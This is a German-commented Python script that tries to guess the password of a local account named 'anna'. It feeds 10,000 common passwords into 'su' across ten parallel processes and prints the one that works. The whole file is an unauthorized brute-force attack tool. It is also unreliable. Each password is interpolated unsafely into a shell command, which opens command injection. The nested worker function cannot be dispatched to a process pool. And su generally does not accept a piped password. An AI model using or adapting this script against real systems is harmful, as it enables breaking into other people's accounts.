import subprocess
from concurrent.futures import ProcessPoolExecutor

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path = "./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username = "anna"

# Bereich von Zeilennummern, die untersucht werden sollen
start_line = 0
end_line = 10000

# Funktion zum Überprüfen eines Passworts
def check_password(password):
    command = f"echo '{password}' | su {username} 2>&1"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode, result.stderr.decode()

# Hauptfunktion
def main():
    # Liste aller Passwörter
    passwords = [line.strip() for i, line in enumerate(open(password_list_path, "r")) if start_line <= i < end_line]

    # Anzahl der Passwörter in der Liste
    total_passwords = len(passwords)

    # Anzahl der Prozesse
    num_processes = 10

    # Teilen Sie die Passwörter in Unterlisten auf, um von mehreren Prozessen verarbeitet zu werden
    chunk_size = total_passwords // num_processes
    password_chunks = [passwords[i:i+chunk_size] for i in range(0, total_passwords, chunk_size)]

    # Funktion zum Überprüfen der Passwörter in einem Chunk
    def process_chunk(password_chunk):
        for password in password_chunk:
            return_code, error_message = check_password(password)
            if return_code == 0:
                print(f"Erfolgreich angemeldet als '{username}' mit dem Passwort '{password}'")
                return password
        return None

    # Verwenden Sie einen Prozesspool, um mehrere Prozesse parallel auszuführen
    with ProcessPoolExecutor(max_workers=num_processes) as executor:
        # Starten Sie die Prozesse und erhalten Sie die Ergebnisse
        results = executor.map(process_chunk, password_chunks)

        # Überprüfen Sie die Ergebnisse auf erfolgreiche Anmeldungen
        for result in results:
            if result is not None:
                print("Das Passwort wurde gefunden:", result)
                break

if __name__ == "__main__":
    main()
